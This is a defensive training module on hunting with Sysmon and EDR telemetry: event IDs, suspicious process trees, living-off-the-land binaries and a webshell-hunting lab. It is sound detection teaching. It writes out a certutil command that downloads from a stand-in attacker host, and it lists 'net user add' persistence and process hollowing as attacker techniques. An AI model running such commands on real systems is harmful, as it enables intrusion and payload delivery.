# Endpoint Telemetry (Sysmon & EDR)

## 1. Orientation

### What this module covers
Logs tell you *what* happened. Telemetry tells you *how*. Sysmon (System Monitor) provides deep visibility into Windows internals (Process creation, Network connections, Driver loads).

### Learning Objectives
*   Install and Config **Sysmon**.
*   Analyze **Process Trees** (Parent-Child relationships).
*   Detect **Living off the Land** binaries (LOLBins).

---

## 2. Core Content

### Sysmon Capabilities
Standard Event Logs show "Audit Failure". Sysmon shows:
*   **Event 1:** Process Creation (Command Line arguments, Parent Process, Hash).
*   **Event 3:** Network Connection (Src/Dst IP, Port, Process that made the call).
*   **Event 11:** File Create (Did Word.exe drop a .exe?).

### The Process Tree
Malware rarely appears out of nowhere. It is spawned.
*   **Normal:** `explorer.exe` -> `chrome.exe`.
*   **Suspect:** `winword.exe` -> `cmd.exe` (Macro exploit).
*   **Critical:** `tomcat.exe` -> `whoami.exe` (Webshell RCE).

### LOLBins
Attackers use built-in tools to hide.
*   *Certutil:* Download files (`certutil -urlcache -f http://evil.exe`).
*   *Mshta:* Execute scripts.
*   *Rundll32:* Load malicious DLLs.

---

## 3. Lab: Hunting the Webshell

### Scenario
Web Server (IIS) is compromised.

**Sysmon Query:**
`EventID=1 AND ParentImage="*w3wp.exe"` (`w3wp` is the IIS worker process).

**Results:**
1.  `w3wp.exe` -> `ping.exe` (Recon).
2.  `w3wp.exe` -> `net user add` (Persistence).
3.  `w3wp.exe` -> `powershell.exe` (Payload).

**Verdict:** RCE confirmed. The web app is vulnerable.

---

## 4. Reflection
1.  Why is Command Line logging important? (Seeing `powershell.exe` is useless. Seeing `powershell.exe -enc aGVsbG8...` reveals the script contents).
2.  What is "Process Hollowing"? (Malware starts a legit process like `notepad.exe`, pauses it, replaces its memory with malicious code, and resumes it. EDR detects this via memory scanning).
